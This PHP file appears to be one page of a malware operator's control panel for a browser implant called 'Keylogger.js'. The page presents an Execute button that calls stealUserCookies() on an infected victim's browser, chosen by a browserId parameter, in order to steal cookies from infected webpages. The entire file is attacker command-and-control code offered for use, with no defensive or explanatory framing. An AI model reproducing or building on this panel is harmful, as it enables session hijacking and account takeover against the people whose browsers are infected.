<?php
    include_once('../../inc/commands.inc.php');

    if(isset($_POST['command']) && $_POST['command'] == '1') {
        if(!stealUserCookies($_GET['browserId'])) {
            $execCommand = "Command sent successfull";
        }
        else {
            $execCommand = "Error while sending command";
        }
    }
?>

<html>
    <head>
        <meta charset="UTF-8">
        <title>Keylogger.js</title>
    </head>
    <body>
        <div>
            <p>
                This command try to steal cookies from infected webpage
            </p>
            <div>
                <?php
                    if(isset($execCommand)) {
                        echo $execCommand;
                    }
                ?>
            </div>
            <div>
                <div>
                    <form action="" method="POST">
                        <div>
                            <input type="hidden" name="command" value="1"/>
                            <button type="submit" name="execute">Execute</button>
                        </div>                       
                    </form>
                </div>
            </div>
        </div>
    </body>
</html>


  